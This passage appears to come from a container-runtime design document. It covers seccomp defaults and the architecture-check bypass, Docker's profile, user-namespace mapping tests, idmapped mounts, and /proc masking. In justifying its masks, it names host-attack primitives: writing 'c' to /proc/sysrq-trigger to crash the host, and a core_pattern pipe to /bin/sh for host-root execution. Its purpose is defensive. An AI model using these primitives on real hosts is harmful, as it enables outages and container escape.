| `SECCOMP_RET_TRAP` | `SIGSYS` to the triggering thread; `si_syscall` names the call |
| `SECCOMP_RET_ERRNO` | syscall fails with the errno in the low 16 bits of the action word |
| `SECCOMP_RET_USER_NOTIF` | "Forward the system call to an attached user-space supervisor" (5.0+) |
| `SECCOMP_RET_TRACE` | notify a `ptrace` tracer before executing |
| `SECCOMP_RET_LOG` | execute the call, but log it (4.14+) |
| `SECCOMP_RET_ALLOW` | execute the call |

`[R] HIGH — use `ERRNO(EPERM)` as the default action, not `KILL_*`.** The
reasoning is asymmetric and worth stating precisely:

- **`KILL_PROCESS` produces unrecoverable, undiagnosable failures.** A
  container that dies with `SIGSYS` and no message is indistinguishable from a
  crash. Worse, libraries probe for syscalls at runtime — glibc tries
  `clock_gettime` variants, `getrandom`, `statx`, `renameat2`; Go's runtime
  tries `epoll_pwait2`; jemalloc probes `madvise` flags. A probe that gets
  `EPERM` falls back; a probe that gets killed takes the whole process down.
- **`ERRNO` lets the process see and report the denial**, and `strace` on the
  container shows exactly which call was blocked.
- **`KILL_PROCESS` is right for a hand-tuned allowlist for one known binary**,
  which is not what a general container runtime ships.

`[C] HIGH` — Docker's default profile uses `defaultAction: SCMP_ACT_ERRNO`
with no explicit `defaultErrnoRet`, which libseccomp/runc resolve to `EPERM`.

`[R] MED` — Offer `SCMP_ACT_LOG` as a `--seccomp-audit` mode: run the default
profile with the default action changed to `LOG`, so a user can discover which
syscalls their workload needs before tightening. Cheap (one field change) and
it is the feature that makes a custom profile writable by a non-expert.

### 9.4 The architecture problem — the classic and still-live bypass

`[F] HIGH` — `seccomp_data.arch` is an `AUDIT_ARCH_*` value, and syscall
numbers are **per-architecture**. On x86_64 the same kernel accepts syscalls
from three ABIs:

| ABI | `AUDIT_ARCH_*` | how identified |
|---|---|---|
| x86-64 | `AUDIT_ARCH_X86_64` (0xc000003e) | 64-bit, plain numbers |
| x32 | `AUDIT_ARCH_X86_64` — **the same value** | bit 30 of `nr` set (`__X32_SYSCALL_BIT = 0x40000000`) |
| i386 | `AUDIT_ARCH_I386` (0x40000003) | 32-bit entry, **completely different numbering** |

`[F] HIGH` — `seccomp(2)`: "Because numbering of system calls varies between
architectures … it is usually necessary to verify the value of the `arch`
field." And x86-64 and x32 "both use `AUDIT_ARCH_X86_64`, requiring the
`__X32_SYSCALL_BIT` mask for disambiguation."

**The classic bypass, in three shapes:**

1. **Forgot to check `arch` at all.** A filter that only compares `nr` will
   let an i386 process call `nr = 165` intending `mount` (i386's number) while
   the filter thought it was blocking `nr = 165` = `mount` on x86_64 — which
   happens to also be `mount`, but `nr = 11` is `execve` on i386 and `munmap`
   on x86_64. Any mismatch is a hole. **The fix is to fail closed: if `arch`
   is not one you built rules for, return the default (deny) action.**
2. **Forgot the compat ABI entirely.** A container image with a 32-bit binary
   (or a 64-bit binary that issues an `int 0x80`) runs under `AUDIT_ARCH_I386`.
   If the filter's first instruction is
   `if arch != AUDIT_ARCH_X86_64: ALLOW`, everything is permitted. If it is
   `if arch != AUDIT_ARCH_X86_64: DENY`, the container simply cannot run
   32-bit code — which is safe and usually fine.
3. **Forgot x32.** x32 shares `AUDIT_ARCH_X86_64`, so an `arch` check passes,
   but `nr` has bit 30 set, so `nr == 165` never matches and everything falls
   through to the default. If the default is ALLOW, x32 processes are
   unfiltered. `[F]` This is why libseccomp treats `SCMP_ARCH_X32` as a
   *separate* architecture that must be added explicitly.

`[C] HIGH` — Docker's profile handles this with `archMap`, from
`moby/daemon/pkg/oci/fixtures/default.json`:
```json
"archMap": [
  { "architecture": "SCMP_ARCH_X86_64",
    "subArchitectures": ["SCMP_ARCH_X86", "SCMP_ARCH_X32"] },
  { "architecture": "SCMP_ARCH_AARCH64",
    "subArchitectures": ["SCMP_ARCH_ARM"] },
  { "architecture": "SCMP_ARCH_MIPS64",     "subArchitectures": ["SCMP_ARCH_MIPS","SCMP_ARCH_MIPS64N32"] },
  { "architecture": "SCMP_ARCH_MIPS64N32",  "subArchitectures": ["SCMP_ARCH_MIPS","SCMP_ARCH_MIPS64"] },
  { "architecture": "SCMP_ARCH_MIPSEL64",   "subArchitectures": ["SCMP_ARCH_MIPSEL","SCMP_ARCH_MIPSEL64N32"] },
  { "architecture": "SCMP_ARCH_MIPSEL64N32","subArchitectures": ["SCMP_ARCH_MIPSEL","SCMP_ARCH_MIPSEL64"] },
  { "architecture": "SCMP_ARCH_S390X",      "subArchitectures": ["SCMP_ARCH_S390"] }
]
```
Docker picks the entry matching the host's native arch and adds the native arch
**plus every sub-architecture**, so on x86_64 the emitted filter carries rules
for X86_64, X86 (i386) *and* X32.

`[R] HIGH — our position: emit rules for the native architecture only, and
deny every other `arch` value, including the compat ones.**

Reasoning: adding i386 and x32 rules triples the filter size and triples the
places a mistake hides, and buys the ability to run 32-bit binaries — which
approximately no container image built after 2018 contains. Denying is safe
(the process gets `EPERM` on its first syscall and dies visibly) and is a
strictly smaller trusted computing base. Tradeoff: a user with a genuine
32-bit image gets a hard failure with a confusing message, so the message must
say "this container issued a syscall from the i386 ABI, which this engine's
seccomp profile denies; use `--seccomp=unconfined` or supply a profile with
`SCMP_ARCH_X86`". `[R]` Make the multi-arch behaviour a profile field so a
user *can* opt in — do not hardcode the refusal.

`[R] HIGH` — And regardless of that choice: **the filter's first instruction
must be an `arch` check that branches to the default-deny action for unknown
architectures**, never a fall-through. This is one BPF instruction and it is
the difference between a filter and a decoration.

### 9.5 Where in the creation sequence the filter must go

`[F] HIGH` — Constraints, each independent:

1. The filter **must** be installed before `execve` of the user's entrypoint,
   because after that we no longer control the process.
2. The filter **is** preserved across that `execve`, so installing before is
   sufficient — there is no need for the entrypoint to cooperate.
3. `execve` itself must therefore be **allowed** by the filter, or the
   entrypoint never starts. This is the one non-obvious hole in "block
   everything dangerous": `execve` is dangerous and cannot be blocked at this
   point. (You *can* block `execve` for the container's *children* only by
   using `SECCOMP_RET_TRACE` or a `USER_NOTIF` supervisor that counts
   `execve`s, which is far beyond our scope.)
4. Installing requires `CAP_SYS_ADMIN` **or** `no_new_privs` (§9.2), which
   fixes its position relative to capability dropping.

`[R] HIGH — install immediately before `execve`, after capabilities are
dropped, with `no_new_privs` already set.** This is runc's path 15b, and it is
the one we get for free by defaulting `no_new_privs` on (§8.4). It has the
property runc's comment names: *"Set seccomp as close to execve as possible, so
as few syscalls take place afterward"* — i.e. the fewer of our own syscalls run
under the filter, the fewer things our own profile has to allow for reasons
that have nothing to do with the workload.

`[R] MED` — One practical wrinkle: our init still has to issue `execve` and
possibly `close_range`, `read` (from the sync pipe) and `write` after the
install. Those must be in the profile. Docker's 384-name allowlist includes all
of them, so this is invisible in practice — but a hand-minimised profile will
fail in a confusing way if `execve` or `close_range` is missing.

### 9.6 What Docker's default profile blocks, and why

`[C] HIGH` — Structure, from `moby/daemon/pkg/oci/fixtures/default.json`:
`defaultAction: SCMP_ACT_ERRNO` (⇒ `EPERM`), then an **allowlist of 384
syscall names** with `SCMP_ACT_ALLOW`. **There is not a single
non-`ALLOW` rule in the profile** — everything is denial-by-omission. That is
an important structural fact: the profile is a *closed* allowlist, so a syscall
added to the kernel next year is denied by default.

`[C] HIGH` — The capability-gated rules — these syscalls are allowed only if
the container has the named capability (Docker computes the profile per
container against its final capability set):

| capability | syscalls allowed only with it |
|---|---|
| `CAP_SYS_ADMIN` | `bpf`, `clone` (unrestricted), `fanotify_init`, `lookup_dcookie`, `mount`, `name_to_handle_at`, `perf_event_open`, `quotactl`, `setdomainname`, `sethostname`, `setns`, `syslog`, `umount`, `umount2`, `unshare` |
| `CAP_SYS_MODULE` | `delete_module`, `init_module`, `finit_module`, `query_module` |
| `CAP_SYS_PTRACE` | `kcmp`, `process_vm_readv`, `process_vm_writev`, `ptrace` |
| `CAP_SYS_BOOT` | `reboot` |
| `CAP_SYS_CHROOT` | `chroot` |
| `CAP_SYS_PACCT` | `acct` |
| `CAP_SYS_RAWIO` | `iopl`, `ioperm` |
| `CAP_SYS_TIME` | `settimeofday`, `stime`, `clock_settime` |
| `CAP_SYS_TTY_CONFIG` | `vhangup` |
| `CAP_SYS_NICE` | `get_mempolicy`, `mbind`, `set_mempolicy` |
| `CAP_SYSLOG` | `syslog` |
| `CAP_DAC_READ_SEARCH` | `open_by_handle_at` |

`[R] HIGH` — **Note the belt-and-braces:** every one of those syscalls already
requires the capability in the kernel. Gating them in seccomp too is
*defence in depth against a kernel capability-check bug* — and that is not
theoretical, because CVE-2022-0492 was precisely a missing capability check
(§12.2), and the reason seccomp-enabled containers were immune. **This
duplication is the single most valuable design idea in Docker's profile and we
should copy it.**

`[C] HIGH` — The `clone` argument filter, verbatim from the profile:
```json
{"names":["clone"], "action":"SCMP_ACT_ALLOW",
 "args":[{"index":0,"value":2080505856,"valueTwo":0,"op":"SCMP_CMP_MASKED_EQ"}],
 "excludes":{"caps":["CAP_SYS_ADMIN"],"arches":["s390","s390x"]}}
```
`2080505856` = **`0x7C020000`** =
`CLONE_NEWNET|CLONE_NEWPID|CLONE_NEWUSER|CLONE_NEWIPC|CLONE_NEWUTS|CLONE_NEWNS`.
The rule is `(arg0 & 0x7C020000) == 0`, i.e. **without `CAP_SYS_ADMIN`, `clone`
is allowed only when it requests none of those six namespace flags.** A second
rule with `index: 1` exists for s390/s390x, where `clone`'s arguments are
swapped.

`[R] MED` — Two details worth noticing:
- **`CLONE_NEWCGROUP` (`0x02000000`) is deliberately *not* in the mask.**
  Creating a cgroup namespace is harmless — it only narrows your own view — so
  Docker permits it unprivileged. Getting this right requires knowing why each
  bit is in the mask, which is a good argument for writing the mask as a named
  constant expression rather than a magic number.
- The mask does **not** cover `CLONE_NEWTIME`, because time namespaces are not
  created via `clone` (they need `unshare(CLONE_NEWTIME)` then a fork).

`[C] HIGH — how `clone3` is handled, and it is not what you would guess.**
`clone3` does **not** appear in Docker's profile at all. Instead,
runc post-processes the libseccomp-generated BPF program
(`libcontainer/seccomp/patchbpf/enosys_linux.go`) to **prepend a stub that
returns `-ENOSYS` for any syscall number above the highest number the filter
knows about, per architecture.** The stated reason:
> *"This solution is less than ideal. In the future it would be great to have
> per-arch information about which syscalls were added in which kernel versions
> so we can create far more accurate filter rules"*

The problem it solves: glibc and Go implement **fallbacks** — try `clone3`, and
if it returns `ENOSYS`, use `clone`. Try `faccessat2`, fall back to
`faccessat`. If the filter returns `EPERM` instead of `ENOSYS`, the fallback
never triggers and the library reports a hard failure. So a naive
allowlist-with-EPERM-default breaks glibc ≥ 2.34 outright, because its
`posix_spawn` uses `clone3` first.

The stub also handles x32 (bit 30 of `nr`) and s390's syscall-0 multiplexing
specially, and switches from direct BPF jumps to skip chains when the jump
distance exceeds the 255-instruction single-byte limit.

`[R] HIGH — this is a requirement on us, not an optional nicety.**
**Unknown/newer syscalls must return `ENOSYS`, not `EPERM`.** Concretely:
compute the maximum syscall number our ruleset mentions for each architecture,
and emit, as the first rules of the filter,
`if nr > max_known_for_this_arch: return ERRNO(ENOSYS)`. Without this our
containers break on any image with a modern glibc, and the symptom
("`posix_spawn` failed") points nowhere near seccomp.

`[R] MED` — Building the filter by hand (§19.1) makes this trivial — it is two
BPF instructions we emit ourselves — whereas runc has to *patch* libseccomp's
output because libseccomp has no way to express it. **This is a genuine
argument for hand-building the BPF rather than using libseccomp.**

### 9.7 The cost of a wrong default, in both directions

`[R] HIGH — too permissive.** The concrete losses, in order of severity:
1. `unshare`/`mount` unblocked ⇒ CVE-2022-0492 class escapes work even
   without `CAP_SYS_ADMIN` if there is a kernel capability-check bug.
2. `bpf` unblocked ⇒ arbitrary kernel-memory read on any kernel with a JIT/
   verifier bug, and there is a steady supply of those.
3. `keyctl` unblocked ⇒ the container shares the host's keyring namespace
   pre-5.x-ish; a container can add keys visible to the host.
4. `add_key`, `request_key`, `userfaultfd` (a favourite kernel-exploit
   primitive for winning races), `process_vm_writev`, `ptrace` ⇒ exploit
   primitives.
5. New syscalls default-allowed ⇒ every kernel release silently widens the
   attack surface. **This is why the profile must be an allowlist, not a
   denylist**, and it is the single most important structural decision in §9.

`[R] HIGH — too restrictive.** Also real, and it is what actually happens to
people:
1. `clone3` returning `EPERM` instead of `ENOSYS` breaks glibc ≥ 2.34
   (§9.6) — this took Docker and Kubernetes months to shake out and affected
   every Ubuntu 22.04 / Fedora 35 image.
2. `statx` denied ⇒ `ls` fails on some filesystems.
3. `io_uring` denied ⇒ modern Node/nginx/Postgres builds fall back or fail.
   `[C]` Docker's profile **does** block `io_uring_setup` (it is not in the
   allowlist) — deliberately, because io_uring has had a long run of
   privilege-escalation bugs. This is a case where Docker chose breakage over
   attack surface, and I think correctly.
4. `membarrier`, `rseq`, `clock_gettime64` denied ⇒ modern glibc/Go crash on
   startup.
5. `personality` restricted to `{0, 8, 0x20000, 0x20008, 0xffffffff}` ⇒
   `setarch`/`ADDR_NO_RANDOMIZE` fails, which breaks some debugger and
   build-reproducibility workflows.

`[R] HIGH — our position: adopt Docker's profile essentially verbatim as our
default.** Not because it is elegant — it is not — but because it encodes a
decade of "which syscall does which image need" that we cannot rediscover, and
because *our* default being different from Docker's is a compatibility bug
users will experience as random breakage. `[R]` What we should add on top:
(a) the `ENOSYS`-above-max rule as a first-class feature rather than a patch,
(b) `--seccomp-audit` (§9.3), (c) native-arch-only rules (§9.4). What we should
**not** do is write our own allowlist from first principles.
---

## 10. User namespaces and UID/GID mapping

### 10.1 The `uid_map` / `gid_map` write rules

`[F] HIGH` — `user_namespaces(7)`. To write `/proc/<pid>/uid_map`:

1. **Write-once.** "An attempt to write more than once to a `uid_map` file in a
   user namespace fails with the error `EPERM`."
2. **Position.** The writer must be "either in the user namespace of the
   process *pid* or be in the parent user namespace".
3. **Capability.** The writer needs "`CAP_SETUID` (`CAP_SETGID`) capability in
   the user namespace of the process *pid*". With that, arbitrary multi-line
   maps are allowed.
4. **The unprivileged single-mapping rule.** Without parent-namespace
   privilege: "The data written to `uid_map` (`gid_map`) must consist of a
   single line that maps the writing process's effective user ID (group ID) in
   the parent namespace to a user ID (group ID) in the user namespace."
5. **Line limit.** 5 lines up to 4.14; **340 lines** since 4.16.
6. **`gid_map` requires `setgroups` handling.** "Writing 'deny' to the
   `/proc/pid/setgroups` file before writing to `/proc/pid/gid_map` will
   permanently disable `setgroups(2)` in a user namespace." Once `gid_map` is
   written, "it is no longer possible to disallow `setgroups(2)`".

`[F] HIGH — why `setgroups` must be denied.** The man page's own reasoning:
an unprivileged user in a new userns could otherwise call `setgroups(0, NULL)`
to *drop* a group, and "this then allowed formerly unprivileged users to drop
groups and thus gain file access that they did not previously have" — the
negative-permission case, e.g. a file with mode `0604` and group `staff`
denies `staff` members read access that `other` has. Dropping `staff` grants
it. So `setgroups` must be off before any gid mapping exists.

### 10.2 Empirical: what actually fails, and with which errno

All on `old-host` (Rocky 8.8, `4.18.0-425.3.1.el8.x86_64`, uid 900000000,
gid 709200513, **no `/etc/subuid` entry for this user**).

`[O] HIGH — the finding that changes the ordering of our code.**
```
$ unshare -U bash -c 'echo "0 900000000 1" > /proc/self/uid_map'
bash: line 0: echo: write error: Operation not permitted     # EPERM
$ unshare -U grep -E '^Cap' /proc/self/status
CapInh: 0000000000000000
CapPrm: 0000000000000000       <-- ZERO
CapEff: 0000000000000000       <-- ZERO
CapBnd: 000001ffffffffff
```
versus, with **no `execve`** between `unshare(2)` and the write (a Python
process calling `libc.unshare(CLONE_NEWUSER)` in-process):
```
CapPrm: 000001ffffffffff       <-- FULL
CapEff: 000001ffffffffff
Uid:    65534 65534 65534 65534    <-- overflowuid, map not yet written
uid_map write OK
```
and with `unshare -Ur` (which writes the map *before* exec):
```
CapPrm: 000001ffffffffff
CapEff: 000001ffffffffff
```

**Explanation, and it is documented, not surprising once seen.**
`user_namespaces(7)`: a `CLONE_NEWUSER` child "starts out with a complete set
of capabilities in the new user namespace", but on `execve`, "unless the
process has a user ID of 0 within the namespace, or the executable file has a
nonempty inheritable capabilities mask, the process will lose all
capabilities." Feeding that through the §8.1 formula: `F(permitted) = 0`,
`F(inheritable) = 0`, `P(ambient) = 0`, euid ≠ 0 so no root special case ⇒
`P'(permitted) = 0`. The `EPERM` on the map write is then rule 3 failing:
we have no `CAP_SETUID` **anywhere**.

`[R] HIGH — the requirement this places on our code: write `uid_map`/`gid_map`
before the child `execve`s anything, from a process that has not `execve`d
since `unshare`/`clone`.** In practice: the *parent* writes
`/proc/<child>/uid_map` while the child blocks on a sync pipe. That is what
runc does and it is not merely convention — an implementation that tries to
have the child map itself after re-exec'ing a helper will hit this `EPERM` and
the cause is invisible from the errno.

`[O] HIGH` — The rest of the matrix, all on `old-host`:

| attempt | result |
|---|---|
| unprivileged, `uid_map` = `"0 <own-uid> 1"`, after `execve` | `EPERM` (caps gone, §above) |
| unprivileged, `uid_map` = `"0 100000 1"` (a uid that is not ours) | `EPERM` — rule 4 requires our own euid |
| unprivileged, two-line `uid_map` | `EPERM` — rule 4 allows one line |
| `gid_map` written **without** `setgroups=deny` first | `EPERM`; `/proc/self/setgroups` still reads `allow` |
| `echo deny > /proc/self/setgroups` from an `unshare -U`'d **exec'd** shell | `EACCES` ("Permission denied") — needs `CAP_SETGID` in the ns, which exec destroyed |
| re-writing `uid_map` after a successful write (`unshare -Ur`) | `EPERM` — write-once |
| `echo allow > /proc/self/setgroups` after `unshare -Ur` (map already written) | `EPERM`; file reads `deny` — matches rule 6's "no longer possible" |

`[O] HIGH — `newuidmap`/`newgidmap` on RHEL-family use file capabilities, not
the setuid bit.**
```
$ getcap /usr/bin/newuidmap /usr/bin/newgidmap
/usr/bin/newuidmap cap_setuid=ep
/usr/bin/newgidmap cap_setgid=ep
$ ls -l /usr/bin/newuidmap
-rwxr-xr-x 1 root root 48904 Nov 21 2023 /usr/bin/newuidmap     # NO setuid bit
```
`[R] MED` — This matters for us in one specific way: **`no_new_privs` disables
file capabilities too** (§8.4). So a rootless engine that sets
`no_new_privs` on itself and then shells out to `newuidmap` will find it
silently unprivileged and get `EPERM`. If we ever call `newuidmap`, it must be
before we set `no_new_privs`, or from a process that never sets it.

`[O] HIGH — with no `/etc/subuid` entry, `newuidmap` refuses.**
`/etc/subuid` on this host has 12 entries (`robertph-local:100000:65536`,
`cryosparcuser:231072:65536`, …) but **none for `sataromk`**. Results:
```
$ newuidmap <pid> 0 900000000 1 1 100000 65536
newuidmap: uid range [1-65537) -> [100000-165536) not allowed
$ newuidmap <pid> 0 900000000 1
newuidmap: write to uid_map failed: Operation not permitted
```
The first is `newuidmap`'s own `/etc/subuid` check. The second failing is
`MED`-confidence in cause — my best reading is that the target process was not
the direct child I intended (I found it by `pgrep`), so `newuidmap`'s
`/proc/<pid>` ownership check or the kernel's namespace-relationship check
failed. **Settled by** a proper parent/child harness on the local VM.

### 10.3 What "no `/etc/subuid` entry" concretely breaks

`[O] old-host HIGH` — With only a single-UID mapping (`0 <uid> 1`, `0 <gid> 1`),
which is all `unshare -Ur` can produce:

**1. Any file owned by an unmapped uid is `nobody`, and cannot be `chown`ed
to.**
```
$ unshare -Ur chown 100:100 /tmp/d5-900000000/f
chown: changing ownership of '…/f': Invalid argument       # EINVAL, not EPERM
```
`EINVAL`, because uid 100 has no representation in the namespace — the kernel
cannot translate it, so it is not a permission failure but an argument
failure. **This is exactly what breaks extracting an image whose tar contains
`uid 100` (`debian`'s `_apt`), `uid 33` (`www-data`), or `uid 999`
(`postgres`) files.** D3 owns the extraction; the *cause* is here.

`[O] MED` — Oddly, `chown 0:0` on the same file also returned `EINVAL` while
`chown 0` (uid only) returned `0`. So the failure is on the **gid** argument,
even though gid 0 maps to our primary gid. `MED` — I could not explain this;
`setgroups=deny` plus the supplementary-group set is my suspicion.
**Settled by** an `strace` of `chown(2)` in that namespace on the local VM.

**2. A process cannot drop to `nobody` or to any service uid.**
```
$ unshare -Ur setpriv --reuid 65534 --regid 65534 --clear-groups id
setpriv: setresuid failed: Invalid argument                # EINVAL
```
Again `EINVAL`, for the same reason. **This breaks every image whose entrypoint
drops privileges** — `nginx` → `www-data`, `postgres` → `postgres`,
`redis` → `redis`. `[O] old-host` confirms the mechanism; the practical
consequence is that a single-UID rootless container can only run its workload
as the one mapped uid.

**3. `useradd`/`groupadd` in a `docker build` fail** for the same reason.

`[R] HIGH` — So the honest rootless story without subuid is: **one uid works,
multi-uid images do not, and the failure errno is `EINVAL` which reads like a
bug in our code rather than a missing `/etc/subuid` line.** Our error message
must intercept this: when a `chown`/`setresuid` in a userns returns `EINVAL`,
report "uid N is not mapped in this container's user namespace; add a subuid
range for <user> in /etc/subuid (requires root) or run this image as a single
uid".

### 10.4 "Root inside vs root outside", operationally

`[O] host-a HIGH` — A default Docker container has **no user namespace**:
```
$ readlink /proc/<container-pid1>/ns/user      -> user:[4026531837]
$ readlink /proc/1/ns/user                     -> user:[4026531837]   # same
$ cat /proc/<container-pid1>/uid_map
         0          0 4294967295
```
Identical namespace inode as host PID 1, and an identity map over the whole
32-bit uid space. **`uid 0` in the container *is* `uid 0` on the host.** The
container's `ipc`, `mnt`, `net`, `pid`, `uts` and `cgroup` namespaces are all
distinct (`4026532500`, `…438`, `…504`, `…502`, `…439`, `…503`); `user` and
`time` are shared with the host.

`[R] HIGH` — Restating what that means, because it is the crux of §16:
in a default Docker container, root is *host root* with a 14-capability
bounding set, a seccomp filter, and an AppArmor profile. Remove any one of
those three and it is host root with a namespace view. There is no
uid-based boundary at all. **This is the single most under-appreciated fact
about default container security.**

`[C] HIGH` — Docker's `userns-remap` mode maps container `0..65535` to a host
range (from `/etc/subuid` for the `dockremap` user), giving a real uid
boundary. `[O] host-a` — `/etc/subuid` has `deploy:100000:65536` and
`/etc/docker/daemon.json` does not exist, so remapping is **off**, which is
Docker's default and why the observation above holds.

`[R] HIGH` — For our engine: **support a user namespace with a mapping from
the start, even in root mode, and make "no userns" the opt-out.** Reasoning:
retrofitting userns is the expensive rootless retrofit (§18), and the seam is
the same one whether we are root or not. Tradeoff: bind-mounted host volumes
need either idmapped mounts (§10.5) or a matching `chown`, and that friction is
exactly why Docker made remapping opt-in. `[R]` Resolve with idmapped
mounts, which is why they are on the "strongly wanted" line of §7.1.

### 10.5 Idmapped mounts — the modern alternative to `chown`ing a layer

`[F] HIGH` — Since **5.12**, `mount_setattr(2)` with
`MOUNT_ATTR_IDMAP` and `userns_fd` pointing at a user namespace attaches an
**id-mapping to a mount**, not to a filesystem or an inode. Reads and writes
through that mount translate uids/gids through the namespace's map; the
on-disk ownership is untouched, and other mounts of the same filesystem are
unaffected. Source: `mount_setattr(2)`.

`[R] HIGH — why this is architecturally important and not just convenient.**
The alternative, which is what rootless Podman does without it, is to
`chown -R` the entire extracted image layer into the subuid range. That means:
- the layer is **no longer shareable** between users (each user's copy has
  different ownership) — so the content-addressed store's deduplication breaks
  along user boundaries;
- extraction cost becomes O(files) in `chown` syscalls on top of O(bytes);
- a 1 GB image with 100k files is a multi-second `chown` storm on every first
  run.
With idmapped mounts: extract once, own it as the engine's uid, and attach a
different idmap per container. **This is the difference between "rootless works"
and "rootless is usable".**

`[R] HIGH` — Same mechanism solves the bind-mount-a-host-volume problem: mount
the host path with an idmap that maps the container's uid range onto the
host uid that owns the directory, instead of `chown`ing the user's data.

`[F] MED` — Filesystem support is per-filesystem: ext4, XFS, btrfs, FAT from
5.12; **overlayfs as the *upper* layer from 5.19**; tmpfs from 6.3. `MED` on
the exact versions per filesystem. **Settled by** `Documentation/filesystems/idmappings.rst`
and each filesystem's `FS_ALLOW_IDMAP` flag. `[R]` This matters because our
container rootfs *is* an overlayfs, so "idmap the container's rootfs directly"
needs 5.19+, while "idmap the lower layers and bind mounts" works at 5.12+.
Cross-reference D3.

`[R] HIGH` — Practical seam: the engine's mount code must take an
`Option<IdMapping>` per mount from day one, even when it is always `None` in
root mode. See §18.
---

## 11. `/proc` and `/sys` handling

### 11.1 Why `mount -t proc proc /proc` is not enough

`[F] HIGH` — A fresh procfs mount in a new PID namespace correctly shows only
that namespace's processes. But procfs also exposes a large set of
**non-process, host-global** files that a PID namespace does not virtualise at
all: `/proc/kcore` (the whole of physical memory as an ELF core file),
`/proc/sys/**` (every sysctl), `/proc/sysrq-trigger`, `/proc/kallsyms`,
`/proc/keys`, `/proc/timer_list`, `/proc/interrupts`, `/proc/bus/pci`. None of
these are namespaced (a handful of `/proc/sys/net/*` and
`/proc/sys/kernel/{hostname,domainname,shm*,msg*,sem}` are, via net/uts/ipc
namespaces; the rest are not).

`[F] HIGH` — So the mount gives you *process* isolation of `/proc` and nothing
else. **`/proc/sysrq-trigger` alone is enough to crash or reboot the host
(`echo c > /proc/sysrq-trigger`), and `/proc/sys/kernel/core_pattern` is enough
to get host-root code execution** (set it to `|/bin/sh -c …` and cause a core
dump — the kernel runs the pipe program in the *initial* namespaces as root).

### 11.2 `maskedPaths` and `readonlyPaths`

`[F] HIGH` — OCI Runtime Spec `config-linux.md`: `linux.maskedPaths` is "an
array of paths that must be masked so the container cannot access them";
`linux.readonlyPaths` is "an array of paths that must be set read-only".

`[C] HIGH — how runc implements them** (`libcontainer/rootfs_linux.go`):
- **masking a file**: `mount --bind /dev/null <path>` — the path still exists,
  `open()` succeeds, reads return EOF. Chosen over deleting because programs
  that `stat()` the path do not break.
- **masking a directory**: `mount -t tmpfs -o ro tmpfs <path>` — an empty
  read-only directory.
- **read-only path**: `mount --bind <path> <path>` then
  `mount -o remount,bind,ro <path>` — a bind of a path onto itself, remounted
  read-only. The two-step is required because `MS_RDONLY` cannot be set in the
  initial `MS_BIND` call (the kernel ignores it) — a classic bug.
- Non-existent paths are skipped silently (`ENOENT` ignored).

`[C] HIGH` — Docker's masked list, from
`moby/daemon/pkg/oci/defaults.go:defaultLinuxMaskedPaths()`:
```
/proc/acpi          /proc/asound        /proc/interrupts    /proc/kcore
/proc/keys          /proc/latency_stats /proc/sched_debug   /proc/scsi
/proc/timer_list    /proc/timer_stats   /sys/devices/virtual/powercap
/sys/firmware
+ /sys/devices/system/cpu/cpu<N>/thermal_throttle  for each possible CPU
```
and read-only: `/proc/bus`, `/proc/fs`, `/proc/irq`, `/proc/sys`,
`/proc/sysrq-trigger`.

Why each of the interesting ones:

| path | what it leaks / enables |
|---|---|
| `/proc/kcore` | all of physical memory as an ELF core — read host secrets, kernel memory, other containers' memory |
| `/proc/sys` (**read-only**, not masked) | writable ⇒ `core_pattern` host RCE, `modprobe` hijack, `kexec`; readable is mostly harmless and some programs need it |
| `/proc/sysrq-trigger` | `echo c` ⇒ host panic; `echo b` ⇒ host reboot |
| `/proc/keys` | kernel keyring contents |
| `/proc/timer_list`, `/proc/sched_debug`, `/proc/latency_stats` | **host process names and pids**, defeating PID-namespace opacity; also timing side channels |
| `/proc/interrupts` | interrupt counts ⇒ keystroke-timing and cryptographic side channels (moby GHSA-6fw5-f8r9-fgfm) |
| `/sys/devices/virtual/powercap` | Intel RAPL energy counters ⇒ **PLATYPUS** side-channel key recovery (CVE-2020-8694; moby GHSA-jq35-85cj-fj4p) |
| `/sys/devices/system/cpu/*/thermal_throttle` | thermal side channel (same advisory) |
| `/sys/firmware` | EFI variables, SMBIOS, DMI — host identity and sometimes secrets |
| `/proc/acpi` | ACPI tables and, historically, writable ACPI methods |
| `/proc/asound`, `/proc/scsi`, `/proc/bus` | hardware enumeration |
| `/proc/irq` (**read-only**) | writable `smp_affinity` ⇒ host-wide interrupt steering / DoS |
| `/proc/fs` (**read-only**) | filesystem-internal tunables |

### 11.3 Verified: the real mounts inside a live container

`[O] host-a HIGH` — `/proc/2588141/mountinfo` for `webapp-nginx-1`,
`nginx:stable`, no security flags. The relevant lines, verbatim (device numbers
shown because they are the evidence for *how* the mask was done):

```
1033 1030 0:89 /       /proc            rw,nosuid,nodev,noexec,relatime - proc  proc  rw
1038 1030 0:96 /       /sys             ro,nosuid,nodev,noexec,relatime - sysfs sysfs ro
1034 1030 0:90 /       /dev             rw,nosuid                        - tmpfs tmpfs rw,size=65536k,mode=755
1035 1034 0:93 /       /dev/pts         rw,nosuid,noexec,relatime        - devpts devpts rw,gid=5,mode=620,ptmxmode=666
1046 1034 0:98 /       /dev/shm         rw,nosuid,nodev,noexec,relatime  - tmpfs shm   rw,size=65536k
1042 1038 0:29 /system.slice/docker-301b….scope  /sys/fs/cgroup  ro,nosuid,nodev,noexec,relatime - cgroup2 cgroup rw,nsdelegate,memory_recursiveprot

602 1033 0:89 /bus           /proc/bus           ro,nosuid,nodev,noexec,relatime - proc proc rw
603 1033 0:89 /fs            /proc/fs            ro,…
604 1033 0:89 /irq           /proc/irq           ro,…
606 1033 0:89 /sys           /proc/sys           ro,…
607 1033 0:89 /sysrq-trigger /proc/sysrq-trigger ro,…

608 1033 0:99  / /proc/acpi          ro,relatime - tmpfs tmpfs ro
617 1033 0:100 / /proc/scsi          ro,relatime - tmpfs tmpfs ro
619 1038 0:101 / /sys/firmware       ro,relatime - tmpfs tmpfs ro

609 1033 0:90 /null /proc/interrupts    rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755
610 1033 0:90 /null /proc/kcore         rw,nosuid - …
611 1033 0:90 /null /proc/keys          rw,nosuid - …
612 1033 0:90 /null /proc/latency_stats rw,nosuid - …
616 1033 0:90 /null /proc/timer_list    rw,nosuid - …
```

Five things this confirms or corrects:

1. **The read-only paths are bind mounts of subtrees of the container's own
   procfs onto themselves** — source device `0:89` (the container's `proc`) with
   root `/bus`, `/fs`, `/irq`, `/sys`, `/sysrq-trigger`, target the same path,
   `ro`. Exactly the two-step bind+remount described above.
2. **The file masks are binds of `/dev/null` from the container's own `/dev`
   tmpfs** — source `0:90` (the container's `/dev`, not the host's) with root
   `/null`. That is a nice detail: runc masks with the container's `null`
   device, so the mask survives even if the host's `/dev/null` is replaced.
